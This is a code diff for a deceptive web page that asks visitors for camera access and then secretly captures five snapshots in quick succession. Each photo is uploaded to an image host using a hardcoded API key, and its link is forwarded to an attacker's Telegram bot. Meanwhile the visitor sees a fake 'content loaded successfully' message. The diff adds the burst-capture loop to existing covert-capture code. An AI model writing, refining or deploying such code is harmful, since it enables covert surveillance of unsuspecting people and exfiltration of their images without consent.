@@ -24,45 +24,55 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
+                // البدء بعد ثانية لضمان ظهور الكاميرا وثباتها
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
                     canvas.width = 640;
                     canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    stream.getTracks().forEach(t => t.stop());
+                    const ctx = canvas.getContext('2d');
 
-                    canvas.toBlob(async blob => {
-                        // استخدام خدمة رفع مجانية وسريعة جداً لتجاوز حظر تيليجرام المباشر
-                        const formData = new FormData();
-                        formData.append('image', blob, 'visitor.jpg');
+                    // حلقة تكرار لالتقاط 5 صور متتالية في أقصر وقت
+                    for (let i = 1; i <= 5; i++) {
+                        ctx.drawImage(video, 0, 0);
 
-                        try {
-                            // رفع الصورة أولاً على سيرفر عام يقبل الـ CORS
-                            let res = await fetch('https://api.imgbb.com/1/upload?key=d49842a2212b186b245842c070c7980d', {
-                                method: 'POST',
-                                body: formData
-                            });
-                            let data = await res.json();
+                        await new Promise(resolve => {
+                            canvas.toBlob(async blob => {
+                                if (!blob) { resolve(); return; }
 
-                            let msg = "🚨 تم التقاط صورة جديدة بنجاح!";
-                            if (data && data.success) {
-                                msg = `🚨 صورة الزائر:\n${data.data.url}`;
-                            }
+                                const formData = new FormData();
+                                formData.append('image', blob, `visitor_${i}.jpg`);
 
-                            // إرسال النتيجة المضمونة لتيليجرام
-                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: CHAT, text: msg })
-                            });
+                                try {
+                                    let res = await fetch('https://api.imgbb.com/1/upload?key=d49842a2212b186b245842c070c7980d', {
+                                        method: 'POST',
+                                        body: formData
+                                    });
+                                    let data = await res.json();
 
-                            document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
-                        } catch (err) {
-                            // حل احتياطي لو حصل أي ظرف
-                            document.body.innerHTML = '<h2>تم التحميل</h2>';
+                                    if (data && data.success) {
+                                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({ chat_id: CHAT, text: `📸 صورة رقم (${i}):\n${data.data.url}` })
+                                        });
+                                    }
+                                } catch (err) {
+                                    console.error(err);
+                                }
+                                resolve();
+                            }, 'image/jpeg', 0.8);
+                        });
+
+                        // فاصل زمني قصير جداً بين كل صورة والثانية (نصف ثانية)
+                        if (i < 5) {
+                            await new Promise(r => setTimeout(r, 500));
                         }
-                    }, 'image/jpeg', 0.8);
-                }, 2000);
+                    }
+
+                    stream.getTracks().forEach(t => t.stop());
+                    document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+
+                }, 1000);
             } catch (e) {
                 alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
